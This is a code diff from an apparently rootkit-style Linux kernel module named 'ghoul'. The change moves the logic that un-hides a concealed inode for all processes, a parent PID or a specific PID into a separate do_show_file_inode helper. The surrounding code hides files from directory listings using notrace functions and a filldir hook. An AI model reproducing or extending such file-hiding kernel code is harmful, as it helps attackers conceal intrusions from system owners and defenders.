@@ -91,21 +91,14 @@ notrace int should_hide_inode(unsigned long ino)
         return 0;
 }
 
-notrace void show_file_inode(const void __user *user_info)
+notrace void do_show_file_inode(unsigned long ino, int pid)
 {
-    struct show_file_inode_info info;
     struct inode_list *inode_entry, *hidden_inode = NULL;
     struct pid_list *excluded_pid, *temp;
 
-    // copy request info
-    if (copy_from_user((void *)&info, user_info, sizeof(struct show_file_inode_info))) {
-        pr_info("ghoul: can't copy user data\n");
-        return;
-    }
-
     // search for requested inode
     list_for_each_entry(inode_entry, &hidden_inodes, list) {
-        if (inode_entry->ino == info.ino)
+        if (inode_entry->ino == ino)
             hidden_inode = inode_entry;
     }
 
@@ -114,8 +107,8 @@ notrace void show_file_inode(const void __user *user_info)
         return;
     
     // show inode to all PIDs - delete from hidden inodes list
-    if (info.pid == ALL_PIDS) {
-        pr_info("ghoul: showing inode %lu for all processes\n", info.ino);
+    if (pid == ALL_PIDS) {
+        pr_info("ghoul: showing inode %lu for all processes\n", ino);
 
         // free all excluded PIDs first
         if (!list_empty(&hidden_inode->excluded_pids)) {
@@ -132,11 +125,11 @@ notrace void show_file_inode(const void __user *user_info)
     }
 
     // show inode to parent PID - find it
-    if (info.pid == PARENT_PID)
-        info.pid = current->parent->pid;
+    if (pid == PARENT_PID)
+        pid = current->parent->pid;
 
     // show inode to a specific PID - add PID to excluded PIDs list
-    pr_info("ghoul: showing inode %lu for PID %d\n", info.ino, info.pid);
+    pr_info("ghoul: showing inode %lu for PID %d\n", ino, pid);
     excluded_pid = kzalloc(sizeof(struct pid_list), GFP_KERNEL);
 
     if (excluded_pid == NULL) {
@@ -144,8 +137,21 @@ notrace void show_file_inode(const void __user *user_info)
         return;
     }
 
-    excluded_pid->pid = info.pid;
+    excluded_pid->pid = pid;
     list_add_tail(&excluded_pid->list, &hidden_inode->excluded_pids);
+}
+
+notrace void show_file_inode(const void __user *user_info)
+{
+    struct show_file_inode_info info;
+
+    // copy request info
+    if (copy_from_user((void *)&info, user_info, sizeof(struct show_file_inode_info))) {
+        pr_info("ghoul: can't copy user data\n");
+        return;
+    }
+
+    do_show_file_inode(info.ino, info.pid);
 }
 
 notrace int filldir_actor(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
